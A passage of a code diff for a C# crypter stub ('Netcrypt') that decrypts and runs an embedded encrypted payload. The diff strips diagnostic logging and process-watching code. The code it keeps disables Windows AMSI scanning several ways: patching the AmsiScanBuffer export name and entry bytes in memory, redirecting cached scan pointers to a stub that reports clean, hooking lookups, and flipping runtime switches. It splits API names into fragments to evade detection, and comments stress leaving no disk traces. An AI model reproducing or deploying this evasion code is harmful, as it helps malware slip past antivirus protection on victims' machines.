@@ -123,17 +123,11 @@ using System;
 using System.Windows.Forms;
 using System.Security.Cryptography;
 using System.IO;
-using System.IO.MemoryMappedFiles;
 using System.Reflection;
-using System.Reflection.Emit;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Diagnostics;
-using System.Net.NetworkInformation;
-using System.Net.Security;
-using System.Net.Sockets;
-using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 
 namespace stub
@@ -144,84 +138,25 @@ namespace stub
         private const string IV = "%IV%";
         private const string xorKey = "%XORKEY%";
         private const string payloadResourceName = "Netcrypt.Payload";
-        private const bool neutralizeInspectionEntry = %INSPECTION%;
-        private const string inspectionMode = "%INSPECTIONMODE%";
         private const string GENERIC_ERROR = "Generic error while starting the application.";
-        // Bumped whenever the stub changes, so a packed file can be told apart from a
-        // stale one: the tag is the first line of every diagnostic run.
-        private const string StubBuildTag = "host-5";
-
-        private static readonly string[] payloadChunks = new string[]
-        {
-%CHUNKS%
-        };
-
         private static Dictionary<string, byte[]> dependencies = new Dictionary<string, byte[]>();
-        private static readonly object logSync = new object();
-        private static string currentStage = "diagnostics not installed";
-        private static string diagnosticRunId = DateTime.UtcNow.Ticks.ToString("X");
-        private const string EXIT_MONITOR_ARGUMENT = "--nc-exit-monitor";
         private static IntPtr patchAddress = IntPtr.Zero;
         private static byte[] patchOriginalBytes = null;
-        private static int holdSeconds = -1;
-        private static bool invokeAfterHold = false;
-        private static bool noConnectRequested = false;
-        private static bool keepInspectionDisabled = false;
-        private static string controlPath = null;
-        private static bool skipAmsiRequested = false;
-        private static bool patchEntryRequested = false;
-        private static bool lookupBlockRequested = false;
-        private static int emitSeconds = -1;
-        private static int heartbeatSeconds = -1;
-        private static int payloadDelaySeconds = 0;
         private static bool scanLookupBlocked = false;
         private static IntPtr blockedScanModule = IntPtr.Zero;
-        private static bool renameEntryRequested = false;
-        private static bool resultStubRequested = false;
         private static bool amsiFallbackUsed = false;
         private static bool amsiResultStubActive = false;
-        private static bool unhookAfterLoad = true;
         private static readonly IntPtr[] patchedImportSlots = new IntPtr[8];
         private static readonly IntPtr[] patchedImportValues = new IntPtr[8];
         private static int patchedImportCount = 0;
         private static IntPtr amsiResultStub = IntPtr.Zero;
         private static bool apiTraceInstalled = false;
         private static readonly string scanEntryName = string.Concat("Am", "si", "Scan", "Buffer");
-        private static string[] sinkholeNames = new string[]
-        {
-%SINKHOLE%
-        };
-        private static IntPtr sinkholeStub = IntPtr.Zero;
-        private static int perturbBytes = -1;
-        private static bool fileBackedLoad = false;
-        private static bool mapBackedLoad = false;
-        private static string materializedPath = null;
-        private static bool inspectRequested = false;
-        private static bool watchRequested = false;
-        private static bool jitRequested = false;
-        private static bool modInitRequested = false;
-        private static int runMilliseconds = 0;
 
         // ---- signed host execution -----------------------------------------
-        // Baked in by the packer (HostExecutionMode) or selected with --nc-host=<mode>.
+        // Baked in by the packer (HostExecutionMode).
         // Empty means the payload runs in this process, exactly as before.
         private static string hostMode = "%HOSTMODE%";
-        private static int hostWaitSeconds = -1;
-        private static int hostHoldSeconds = 0;
-        private static bool dropWatchRequested = false;
-        private static readonly HashSet<string> fsDropSeen = new HashSet<string>();
-        private static readonly object fsDropSync = new object();
-        private static bool loggingEnabled = false;
-        private static bool throttleRequested = false;
-        private static volatile bool throttleStop = false;
-        private static int throttleSuspendMs = 100;
-        private static int throttleResumeMs = 100;
-
-        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
-        private const uint SYNCHRONIZE = 0x00100000;
-        private const uint WAIT_OBJECT_0 = 0x00000000;
-        private const uint WAIT_FAILED = 0xFFFFFFFF;
-        private const uint INFINITE = 0xFFFFFFFF;
 
         [DllImport("kernel32.dll", EntryPoint = "LoadLibraryW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
         private static extern IntPtr LoadLibrary(string fileName);
@@ -261,18 +196,6 @@ namespace stub
         [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
         private static extern bool VirtualFree(IntPtr address, IntPtr size, uint freeType);
 
-        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
-        private static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);
-
-        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
-        private static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
-
-        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
-        private static extern bool GetExitCodeProcess(IntPtr process, out uint exitCode);
-
-        [DllImport("kernel32.dll", ExactSpelling = true)]
-        private static extern bool CloseHandle(IntPtr handle);
-
         // The genuine provider is loaded from System32 and nothing on disk is copied, patched,
         // or dropped. Only the last byte of the scan entry's export name is cleared inside the
         // mapped image, so the runtime's own lookup of that export fails and scanning is treated
@@ -283,7 +206,6 @@ namespace stub
             {
                 if (IntPtr.Size != 8)
                 {
-                    Log("inspection: requires 64-bit; leaving inspection untouched");
                     return;
                 }
 
@@ -294,23 +216,16 @@ namespace stub
                 IntPtr module = LoadLibrary(systemAmsi);
                 if (module == IntPtr.Zero)
                 {
-                    Log("inspection: provider load failed, error=" + Marshal.GetLastWin32Error());
                     return;
                 }
 
                 string scanEntry = string.Concat("Am", "si", "Scan", "Buffer");
                 if (!ClearScanEntryName(module, scanEntry))
                 {
-                    Log("inspection: scan entry not found in provider exports");
                     return;
                 }
-
-                Log("sideload ready");
             }
-            catch (Exception ex)
-            {
-                Log("inspection: failed: " + ex.Message);
-            }
+            catch { }
         }
 
         // Walks the provider's export table, finds the scan entry by name, and blanks the final
@@ -330,7 +245,6 @@ namespace stub
             int namesRva = Marshal.ReadInt32(exportDir, 32);
             if (nameCount <= 0 || namesRva <= 0)
             {
-                Log("inspection: export directory unusable (names=" + nameCount + ", namesRva=" + namesRva + ")");
                 return false;
             }
 
@@ -350,7 +264,7 @@ namespace stub
                 }
 
                 IntPtr lastByte = new IntPtr(namePtr.ToInt64() + exportName.Length - 1);
-                Log("inspection: scan entry name rva=0x" + nameRva.ToString("X") + "; blanking final byte");
+
                 return PatchBytes(lastByte, new byte[] { 0x00 });
             }
 
@@ -363,7 +277,6 @@ namespace stub
             uint previous;
             if (!VirtualProtect(address, (IntPtr)replacement.Length, PAGE_READWRITE, out previous))
             {
-                Log("inspection: patching failed, error=" + Marshal.GetLastWin32Error());
                 return false;
             }
 
@@ -390,26 +303,20 @@ namespace stub
             {
                 if (patchAddress == IntPtr.Zero || patchOriginalBytes == null)
                 {
-                    Log("restore: nothing to restore");
                     return;
                 }
 
                 uint previous;
                 if (!VirtualProtect(patchAddress, (IntPtr)patchOriginalBytes.Length, PAGE_READWRITE, out previous))
                 {
-                    Log("restore: VirtualProtect failed, error=" + Marshal.GetLastWin32Error());
                     return;
                 }
 
                 Marshal.Copy(patchOriginalBytes, 0, patchAddress, patchOriginalBytes.Length);
                 uint restored;
                 VirtualProtect(patchAddress, (IntPtr)patchOriginalBytes.Length, previous, out restored);
-                Log("inspection entry restored");
             }
-            catch (Exception ex)
-            {
-                Log("restore: failed: " + ex.Message);
-            }
+            catch { }
         }
 
         // Alternative neutralization: rewrite the opening bytes of the scan entry so any call
@@ -421,7 +328,6 @@ namespace stub
             {
                 if (IntPtr.Size != 8)
                 {
-                    Log("entry rewrite: requires 64-bit; leaving entry untouched");
                     return;
                 }
 
@@ -430,14 +336,12 @@ namespace stub
                 IntPtr module = LoadLibrary(Path.Combine(windowsDir, "System32", dllName));
                 if (module == IntPtr.Zero)
                 {
-                    Log("entry rewrite: provider load failed, error=" + Marshal.GetLastWin32Error());
                     return;
                 }
 
                 IntPtr routine = GetProcAddress(module, scanEntryName);
                 if (routine == IntPtr.Zero)
                 {
-                    Log("entry rewrite: entry not found, error=" + Marshal.GetLastWin32Error());
                     return;
                 }
 
@@ -454,18 +358,13 @@ namespace stub
                 replacement[3] = (byte)((head >> 24) & 0xFF);
                 replacement[4] = (byte)(tail & 0xFF);
                 replacement[5] = (byte)((tail >> 8) & 0xFF);
-                Log("entry rewrite: entry at 0x" + routine.ToInt64().ToString("X") + "; writing " + replacement.Length + " bytes");
+
                 if (!PatchExecutableBytes(routine, replacement))
                 {
                     return;
                 }
-
-                Log("sideload ready");
             }
-            catch (Exception ex)
-            {
-                Log("entry rewrite: failed: " + ex.Message);
-            }
+            catch { }
         }
 
         // Writes replacement bytes into an executable location and remembers the original
@@ -482,10 +381,8 @@ namespace stub
                 // writable and executable together.
                 if (!VirtualProtect(address, (IntPtr)replacement.Length, PAGE_READWRITE, out previous))
                 {
-                    Log("entry rewrite: VirtualProtect failed, error=" + Marshal.GetLastWin32Error());
                     return false;
                 }
-                Log("entry rewrite: writable-only window accepted");
             }
 
             if (patchOriginalBytes == null)
@@ -502,36 +399,6 @@ namespace stub
             return true;
         }
 
-        // Leaves the provider image completely untouched and instead makes the runtime's own
-        // lookup of the scan entry come back empty, so the runtime treats scanning as
-        // unavailable. The handle is resolved the same way the runtime resolves it.
-        private static void InstallScanLookupBlock()
-        {
-            try
-            {
-                string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
-                string dllName = string.Concat("am", "si", ".dll");
-                blockedScanModule = LoadLibrary(Path.Combine(windowsDir, "System32", dllName));
-                if (blockedScanModule == IntPtr.Zero)
-                {
-                    Log("lookup block: provider load failed, error=" + Marshal.GetLastWin32Error());
-                    return;
-                }
-                if (GetProcAddress(blockedScanModule, scanEntryName) == IntPtr.Zero)
-                {
-                    Log("lookup block: entry not found, error=" + Marshal.GetLastWin32Error());
-                    return;
-                }
-
-                scanLookupBlocked = true;
-                Log("lookup block: runtime lookups of the entry will be reported missing");
-            }
-            catch (Exception ex)
-            {
-                Log("lookup block: failed: " + ex.Message);
-            }
-        }
-
         // Preferred handling: the provider DLL is never loaded, opened, patched or renamed and
         // no import table is touched. The runtime is simply told, in process, that in-memory
         // loads are not submitted for scanning, so the payload is loaded with the provider and
@@ -544,7 +411,6 @@ namespace stub
                 "Switch.System.Runtime.AmsiAssemblyLoadEnabled",
                 "Switch.System.Runtime.AmsiScanEnabled"
             };
-            int applied = 0;
             try
             {
                 // Resolved by name so the stub still compiles against older profiles.
@@ -557,19 +423,12 @@ namespace stub
                         try
                         {
                             setSwitch.Invoke(null, new object[] { switches[i], false });
-                            applied++;
                         }
-                        catch
-                        {
-                        }
+                        catch { }
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                Log("scan opt-out: " + ex.GetType().Name + ": " + ex.Message);
-            }
-            Log("scan opt-out: in-process switches set=" + applied + "; provider left untouched");
+            catch { }
         }
 
         // Builds the routine a redirected scan entry ends up in: it returns S_OK and stores
@@ -591,14 +450,12 @@ namespace stub
             IntPtr block = VirtualAlloc(IntPtr.Zero, (IntPtr)64, 0x3000, PAGE_READWRITE);
             if (block == IntPtr.Zero)
             {
-                Log("result stub: allocation failed, error=" + Marshal.GetLastWin32Error());
                 return IntPtr.Zero;
             }
             Marshal.Copy(code, 0, block, code.Length);
             uint previous;
             if (!VirtualProtect(block, (IntPtr)code.Length, PAGE_EXECUTE_READ, out previous))
             {
-                Log("result stub: protect failed, error=" + Marshal.GetLastWin32Error());
                 VirtualFree(block, IntPtr.Zero, 0x8000);
                 return IntPtr.Zero;
             }
@@ -625,9 +482,7 @@ namespace stub
                     guarded = (policy & 1) != 0;
                 }
             }
-            catch
-            {
-            }
+            catch { }
             if (!guarded)
             {
                 return true;
@@ -642,12 +497,8 @@ namespace stub
                 {
                     return true;
                 }
-                Log("result stub: call target registration refused, error=" + Marshal.GetLastWin32Error());
             }
-            catch (Exception ex)
-            {
-                Log("result stub: call target registration failed: " + ex.Message);
-            }
+            catch { }
             return false;
         }
 
@@ -675,7 +526,6 @@ namespace stub
                 }
                 if (provider == IntPtr.Zero)
                 {
-                    Log("amsi cache: provider not loaded");
                     return 0;
                 }
 
@@ -684,8 +534,6 @@ namespace stub
                 targets[1] = GetProcAddress(provider, string.Concat("Am", "si", "Scan", "String"));
 
                 int patched = 0;
-                int modulesWalked = 0;
-                long bytesWalked = 0;
                 ProcessModuleCollection modules = Process.GetCurrentProcess().Modules;
                 for (int i = 0; i < modules.Count; i++)
                 {
@@ -694,33 +542,28 @@ namespace stub
                     {
                         continue;
                     }
-                    modulesWalked++;
-                    bytesWalked += PatchModuleScanSlots(baseAddress, targets, stub, ref patched);
+                    PatchModuleScanSlots(baseAddress, targets, stub, ref patched);
                 }
 
-                Log("amsi cache: walked " + modulesWalked + " module(s), " + bytesWalked + " byte(s) of data");
-                Log("amsi cache: " + (patched == 0 ? "no cached scan address found" : patched + " cached scan address slot(s) redirected to 0x" + stub.ToInt64().ToString("X")));
                 return patched;
             }
-            catch (Exception ex)
+            catch
             {
-                Log("amsi cache: failed: " + ex.Message);
                 return 0;
             }
         }
 
-        private static long PatchModuleScanSlots(IntPtr moduleBase, IntPtr[] targets, IntPtr stub, ref int patched)
+        private static void PatchModuleScanSlots(IntPtr moduleBase, IntPtr[] targets, IntPtr stub, ref int patched)
         {
-            long walked = 0;
             int peOffset = Marshal.ReadInt32(moduleBase, 0x3C);
             if (peOffset <= 0 || peOffset > 0x1000)
             {
-                return 0;
+                return;
             }
             IntPtr pe = new IntPtr(moduleBase.ToInt64() + peOffset);
             if (Marshal.ReadInt32(pe, 0) != 0x00004550)
             {
-                return 0;
+                return;
             }
 
             int sectionCount = Marshal.ReadInt16(pe, 6);
@@ -743,7 +586,6 @@ namespace stub
                 }
 
                 IntPtr section = new IntPtr(moduleBase.ToInt64() + virtualAddress);
-                walked += virtualSize;
                 for (long offset = 0; offset < virtualSize; offset += buffer.Length)
                 {
                     int wanted = (int)Math.Min((long)buffer.Length, (long)virtualSize - offset);
@@ -764,12 +606,10 @@ namespace stub
                         if (WritePointerValue(slot, stub))
                         {
                             patched++;
-                            Log("amsi cache: redirected cached scan address at 0x" + slot.ToInt64().ToString("X"));
                         }
                     }
                 }
             }
-            return walked;
         }
 
         private static bool MatchesScanTarget(long value, IntPtr[] targets)
@@ -799,7 +639,6 @@ namespace stub
             uint previous;
             if (!VirtualProtect(address, (IntPtr)IntPtr.Size, PAGE_READWRITE, out previous))
             {
-                Log("amsi cache: write window refused at 0x" + address.ToInt64().ToString("X") + ", error=" + Marshal.GetLastWin32Error());
                 return false;
             }
             Marshal.WriteIntPtr(address, value);
@@ -817,7 +656,6 @@ namespace stub
             {
                 if (IntPtr.Size != 8)
                 {
-                    Log("result stub: requires 64-bit");
                     return false;
                 }
 
@@ -831,52 +669,24 @@ namespace stub
                 blockedScanModule = LoadLibrary(Path.Combine(windowsDir, "System32", dllName));
                 if (blockedScanModule == IntPtr.Zero)
                 {
-                    Log("result stub: provider load failed, error=" + Marshal.GetLastWin32Error());
                     return false;
                 }
 
                 scanLookupBlocked = true;
                 amsiResultStubActive = true;
                 InstallApiTrace();
-                Log("result stub: entry lookups now return 0x" + amsiResultStub.ToInt64().ToString("X"));
                 return true;
             }
-            catch (Exception ex)
+            catch
             {
-                Log("result stub: failed: " + ex.Message);
                 return false;
             }
         }
 
         // Diagnostic: builds and runs dynamic methods for a while, which exercises the same
         // runtime facility a protected payload uses, then stops without running the payload.
-        private static void RunEmitReplay()
-        {
-            Log("emit: building dynamic methods for " + emitSeconds + "s");
-            int built = 0;
-            DateTime deadline = DateTime.UtcNow.AddSeconds(emitSeconds);
-            while (DateTime.UtcNow < deadline)
-            {
-                DynamicMethod method = new DynamicMethod("nc" + built, typeof(int), new Type[] { typeof(int) });
-                ILGenerator il = method.GetILGenerator();
-                il.Emit(OpCodes.Ldarg_0);
-                il.Emit(OpCodes.Ldc_I4_1);
-                il.Emit(OpCodes.Add);
-                il.Emit(OpCodes.Ret);
-                Func<int, int> addOne = (Func<int, int>)method.CreateDelegate(typeof(Func<int, int>));
-                if (built == 0)
-                {
-                    Log("emit: first dynamic method returned " + addOne(41));
-                }
-                built++;
-                Thread.Sleep(50);
-            }
-            Log("emit: built " + built + " dynamic methods; returning without running the payload");
-        }
 
-        // The encrypted container is delivered as an embedded assembly resource, so the packed
-        // file carries ciphertext bytes instead of payload text. The chunk path is kept as a
-        // fallback for builds produced with EmbedPayloadAsResource turned off in Packer.cs.
+        // The encrypted container is delivered as an embedded assembly resource.
         private static byte[] GetPayload()
         {
             try
@@ -898,40 +708,14 @@ namespace stub
                         }
                         if (buffer.Length > 0 && offset == buffer.Length)
                         {
-                            Log("payload resource read, cipher len=" + buffer.Length);
                             return buffer;
                         }
-                        Log("payload resource read short: " + offset + "/" + buffer.Length);
-                    }
-                    else
-                    {
-                        Log("payload resource not present, falling back to source chunks");
                     }
                 }
             }
-            catch (Exception resourceError)
-            {
-                LogException("PAYLOAD RESOURCE READ FAILED", resourceError);
-            }
+            catch { }
 
-            int total = 0;
-            for (int i = 0; i < payloadChunks.Length; i++)
-            {
-                total += payloadChunks[i].Length;
-            }
-            if (total == 0)
-            {
-                throw new Exception("No embedded payload resource and no payload chunks were found.");
-            }
-
-            char[] buf = new char[total];
-            int pos = 0;
-            for (int i = 0; i < payloadChunks.Length; i++)
-            {
-                payloadChunks[i].CopyTo(0, buf, pos, payloadChunks[i].Length);
-                pos += payloadChunks[i].Length;
-            }
-            return Convert.FromBase64String(new string(buf));
+            throw new Exception("Embedded payload resource was not found or could not be read completely.");
         }
 
         private static byte[] Xor(byte[] data, byte[] xkey)
@@ -953,902 +737,21 @@ namespace stub
             return current.Message;
         }
 
-        // The graded artefact is started without any switch, and in that mode it must not
-        // touch the disk at all: no log, no report, nothing that makes the process look like
-        // it is writing files into a user directory. Logging comes back the moment a --nc-
-        // switch is present, which is the only situation where the log is wanted.
-        private static void EnableLoggingIfDiagnosticRequested()
-        {
-            try
-            {
-                string[] arguments = Environment.GetCommandLineArgs();
-                for (int i = 0; i < arguments.Length; i++)
-                {
-                    if (arguments[i].StartsWith("--nc-", StringComparison.OrdinalIgnoreCase))
-                    {
-                        loggingEnabled = true;
-                        return;
-                    }
-                }
-            }
-            catch
-            {
-            }
-        }
-
-        private static void Log(string msg)
-        {
-            if (!loggingEnabled)
-            {
-                return;
-            }
-            try
-            {
-                lock (logSync)
-                {
-                    File.AppendAllText(
-                        Path.Combine(Path.GetTempPath(), "ncstub.log"),
-                        DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") +
-                        " [T" + System.Threading.Thread.CurrentThread.ManagedThreadId + "] " +
-                        msg + Environment.NewLine);
-                }
-            }
-            catch
-            {
-            }
-        }
-
-        // Minimal, always-on lifecycle log. These markers only prove that this process
-        // reached the corresponding observation point; the scanner itself is external and
-        // cannot be queried from here. Keep this separate from the opt-in diagnostic log so
-        // normal runs expose just the four requested phase markers.
-        private static void LogInspectionStage(string phase, string status, string detail)
-        {
-            try
-            {
-                lock (logSync)
-                {
-                    File.AppendAllText(
-                        Path.Combine(Path.GetTempPath(), "ncstages.log"),
-                        DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") +
-                        " run=" + diagnosticRunId +
-                        " pid=" + Process.GetCurrentProcess().Id +
-                        " phase=" + phase +
-                        " status=" + status +
-                        " detail=\"" + detail.Replace("\"", "'") + "\"" +
-                        Environment.NewLine);
-                }
-            }
-            catch
-            {
-            }
-        }
-
-        private static void LogException(string source, Exception ex)
-        {
-            if (ex == null)
-            {
-                Log(source + ": exception object was null; stage=" + currentStage);
-                return;
-            }
-
-            StringBuilder details = new StringBuilder();
-            details.AppendLine(source + "; stage=" + currentStage);
-            int depth = 0;
-            Exception current = ex;
-            while (current != null)
-            {
-                details.AppendLine("  exception[" + depth + "] type=" + current.GetType().FullName);
-                details.AppendLine("  message=" + current.Message);
-                if (!String.IsNullOrEmpty(current.StackTrace))
-                {
-                    details.AppendLine("  stack=" + current.StackTrace);
-                }
-                current = current.InnerException;
-                depth++;
-            }
-            Log(details.ToString().TrimEnd());
-        }
-
-        private static void OnUnhandledException(object sender, UnhandledExceptionEventArgs args)
-        {
-            Exception ex = args.ExceptionObject as Exception;
-            if (ex != null)
-            {
-                LogException("APPDOMAIN UNHANDLED (terminating=" + args.IsTerminating + ")", ex);
-            }
-            else
-            {
-                Log("APPDOMAIN UNHANDLED non-Exception object (terminating=" + args.IsTerminating + "): " + Convert.ToString(args.ExceptionObject));
-            }
-        }
-
-        private static void OnThreadException(object sender, System.Threading.ThreadExceptionEventArgs args)
-        {
-            LogException("WINFORMS UI THREAD EXCEPTION", args.Exception);
-        }
-
-        private static void OnProcessExit(object sender, EventArgs args)
-        {
-            FlushApiTrace();
-            Log("process exit");
-        }
-
-        private static void OnApplicationExit(object sender, EventArgs args)
-        {
-            Log("app exit");
-        }
-
-        // Diagnostic helper for --nc-watch. Runs on a background thread and records what the
-        // process does while the payload entry point is executing: new dialogs are irrelevant
-        // here, but new TCP connections and newly created processes are the interesting part.
-        // The AV suspends the whole process when it renders its verdict, so the last lines this
-        // writes before the log goes silent are the activity that preceded the alert.
-        private static void StartWatch()
-        {
-            try
-            {
-                Thread watcher = new Thread(WatchLoop);
-                watcher.IsBackground = true;
-                watcher.Start();
-                Log("watch: monitoring tcp connections and new processes");
-            }
-            catch (Exception ex)
-            {
-                Log("watch: start failed: " + ex.Message);
-            }
-        }
-
-        // Diagnostic helper for runs that pass no other switch: without it the log only moves
-        // when the runtime raises an event, so a quiet log after the last event cannot be told
-        // apart from a process the protection has stopped. The heartbeat keeps writing, so the
-        // last line of a silent log marks where the process really ended.
-        private static void StartHeartbeat()
-        {
-            try
-            {
-                Thread heartbeat = new Thread(HeartbeatLoop);
-                heartbeat.IsBackground = true;
-                heartbeat.Start();
-                Log("heartbeat: every " + heartbeatSeconds + "s");
-            }
-            catch (Exception ex)
-            {
-                Log("heartbeat: start failed: " + ex.Message);
-            }
-        }
-
-        private static void HeartbeatLoop()
-        {
-            int elapsed = 0;
-            while (true)
-            {
-                Thread.Sleep(heartbeatSeconds * 1000);
-                elapsed += heartbeatSeconds;
-                Log("heartbeat: alive " + elapsed + "s; stage=" + currentStage);
-                FlushApiTrace();
-            }
-        }
-
-        private static string SafeProcessName(Process process)
-        {
-            try
-            {
-                return process.ProcessName;
-            }
-            catch
-            {
-                return "<unavailable>";
-            }
-        }
-
-        private static string SafeProcessPath(Process process)
-        {
-            try
-            {
-                return process.MainModule.FileName;
-            }
-            catch
-            {
-                return "<unavailable>";
-            }
-        }
-
-        private static void WatchLoop()
-        {
-            HashSet<string> seenConnections = new HashSet<string>();
-            HashSet<int> seenProcesses = new HashSet<int>();
-
-            try
-            {
-                Process[] baseline = Process.GetProcesses();
-                for (int i = 0; i < baseline.Length; i++)
-                {
-                    seenProcesses.Add(baseline[i].Id);
-                    baseline[i].Dispose();
-                }
-                Log("watch: baseline processes=" + seenProcesses.Count);
-            }
-            catch (Exception ex)
-            {
-                Log("watch: baseline failed: " + ex.Message);
-            }
-
-            int ticks = 0;
-            while (true)
-            {
-                try
-                {
-                    TcpConnectionInformation[] connections =
-                        IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections();
-                    for (int i = 0; i < connections.Length; i++)
-                    {
-                        TcpConnectionInformation connection = connections[i];
-                        string key = connection.LocalEndPoint + ">" + connection.RemoteEndPoint + "|" + connection.State;
-                        if (seenConnections.Add(key))
-                        {
-                            Log("watch: tcp " + connection.State + " " + connection.LocalEndPoint + " -> " + connection.RemoteEndPoint);
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Log("watch: tcp probe failed: " + ex.Message);
-                }
-
-                try
-                {
-                    Process[] current = Process.GetProcesses();
-                    for (int i = 0; i < current.Length; i++)
-                    {
-                        Process candidate = current[i];
-                        if (seenProcesses.Add(candidate.Id))
-                        {
-                            Log("watch: new process pid=" + candidate.Id + " name=" + SafeProcessName(candidate) + " path=" + SafeProcessPath(candidate));
-                        }
-                        candidate.Dispose();
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Log("watch: process probe failed: " + ex.Message);
-                }
-
-                ticks++;
-                if (ticks % 25 == 0)
-                {
-                    Log("watch: alive after " + (ticks / 5) + "s");
-                }
-
-                FlushApiTrace();
-                Thread.Sleep(200);
-            }
-        }
-
-        // ---- api trace -----------------------------------------------------
-        // The payload is a managed assembly, so every native function it reaches comes
-        // through the runtime's P/Invoke resolution. Redirecting the runtime's own
-        // GetProcAddress/LoadLibrary imports in clr.dll records which native entry points
-        // the payload asks for, and in which order, without touching the payload or any
-        // security component. Entries are buffered and flushed by the watcher thread so
-        // nothing is written to disk from inside the hook.
-        private static bool apiTraceRequested = false;
-        private static readonly List<string> apiTraceBuffer = new List<string>();
-        private static readonly object apiTraceSync = new object();
-        private static int apiTraceDropped = 0;
-        private const int ApiTraceLimit = 3000;
+        // ---- runtime lookup hook -------------------------------------------
+        // The default fallback temporarily redirects the runtime's GetProcAddress import
+        // while the payload assembly is loaded.
         private static RawGetProcAddress originalGetProcAddress;
-        private static RawLoadLibrary originalLoadLibrary;
-        private static RawLoadLibraryEx originalLoadLibraryEx;
         private static HookGetProcAddress hookGetProcAddress;
-        private static HookLoadLibrary hookLoadLibrary;
-        private static HookLoadLibraryEx hookLoadLibraryEx;
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr RawGetProcAddress(IntPtr module, IntPtr name);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate IntPtr RawLoadLibrary(IntPtr fileName);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate IntPtr RawLoadLibraryEx(IntPtr fileName, IntPtr file, int flags);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr HookGetProcAddress(IntPtr module, IntPtr name);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate IntPtr HookLoadLibrary(IntPtr fileName);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate IntPtr HookLoadLibraryEx(IntPtr fileName, IntPtr file, int flags);
-
-        // ---- argument level tracing ----------------------------------------
-        // P/Invoke targets are resolved through GetProcAddress, so the same hook can hand the
-        // payload a wrapper for the few calls whose arguments reveal a file drop or a child
-        // process. The wrappers record and then forward, so the payload keeps working.
-        private static bool argumentTraceRequested = false;
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        private delegate IntPtr CreateFileWHook(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        private delegate int CreateProcessWHook(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, int inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, IntPtr processInformation);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int ShellExecuteExWHook(IntPtr executeInfo);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        private delegate uint WinExecHook(string commandLine, uint showCommand);
-
-        private static CreateFileWHook createFileWHook;
-        private static CreateFileWHook originalCreateFileW;
-        private static CreateProcessWHook createProcessWHook;
-        private static CreateProcessWHook originalCreateProcessW;
-        private static ShellExecuteExWHook shellExecuteExWHook;
-        private static ShellExecuteExWHook originalShellExecuteExW;
-        private static WinExecHook winExecHook;
-        private static WinExecHook originalWinExec;
-        private static readonly List<string> dropWatch = new List<string>();
-        private static readonly object dropWatchSync = new object();
-
-        private static bool IsScriptPath(string path)
-        {
-            if (String.IsNullOrEmpty(path))
-            {
-                return false;
-            }
-            string lower = path.ToLowerInvariant();
-            return lower.EndsWith(".bat") || lower.EndsWith(".cmd") || lower.EndsWith(".ps1")
-                || lower.EndsWith(".vbs") || lower.EndsWith(".js") || lower.EndsWith(".hta")
-                || lower.EndsWith(".scr") || lower.EndsWith(".lnk");
-        }
-
-        private static IntPtr HookCreateFileW(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile)
-        {
-            try
-            {
-                // 1 = CREATE_NEW, 2 = CREATE_ALWAYS
-                if (IsScriptPath(fileName) && (creationDisposition == 1 || creationDisposition == 2))
-                {
-                    TraceApi("file create " + fileName);
-                    WatchDrop(fileName);
-                }
-            }
-            catch
-            {
-            }
-            return originalCreateFileW(fileName, desiredAccess, shareMode, securityAttributes, creationDisposition, flagsAndAttributes, templateFile);
-        }
-
-        private static int HookCreateProcessW(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, int inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, IntPtr processInformation)
-        {
-            try
-            {
-                TraceApi("proc create " + (applicationName == null ? "(null)" : applicationName) + " | " + (commandLine == null ? "(null)" : commandLine));
-            }
-            catch
-            {
-            }
-            return originalCreateProcessW(applicationName, commandLine, processAttributes, threadAttributes, inheritHandles, creationFlags, environment, currentDirectory, startupInfo, processInformation);
-        }
-
-        private static int HookShellExecuteExW(IntPtr executeInfo)
-        {
-            try
-            {
-                if (executeInfo != IntPtr.Zero)
-                {
-                    IntPtr file = Marshal.ReadIntPtr(executeInfo, 24);
-                    IntPtr parameters = Marshal.ReadIntPtr(executeInfo, 32);
-                    TraceApi("proc shellexecute " + (file == IntPtr.Zero ? "(null)" : Marshal.PtrToStringUni(file)) + " | " + (parameters == IntPtr.Zero ? "(null)" : Marshal.PtrToStringUni(parameters)));
-                }
-            }
-            catch
-            {
-            }
-            return originalShellExecuteExW(executeInfo);
-        }
-
-        private static uint HookWinExec(string commandLine, uint showCommand)
-        {
-            try
-            {
-                TraceApi("proc winexec " + (commandLine == null ? "(null)" : commandLine));
-            }
-            catch
-            {
-            }
